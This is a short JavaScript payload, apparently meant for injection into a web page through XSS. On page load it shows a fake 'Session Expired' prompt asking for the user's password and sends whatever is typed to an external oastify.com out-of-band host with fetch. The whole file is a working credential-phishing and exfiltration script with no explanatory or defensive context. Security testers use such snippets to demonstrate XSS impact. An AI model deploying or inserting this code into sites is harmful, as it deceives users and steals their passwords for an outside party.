window.addEventListener('load', function() {
    // Show a prompt to the user to enter their password
    let password = prompt("Session Expired. Please re-enter your password:");

    // If the user entered a password, send it to the external server using fetch
    if (password) {
        fetch(`https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        }).then(response => {
            // Handle response if needed
            console.log('Password sent successfully');
        }).catch(error => {
            // Handle errors
            console.error('Error sending password:', error);
        });
    }
});
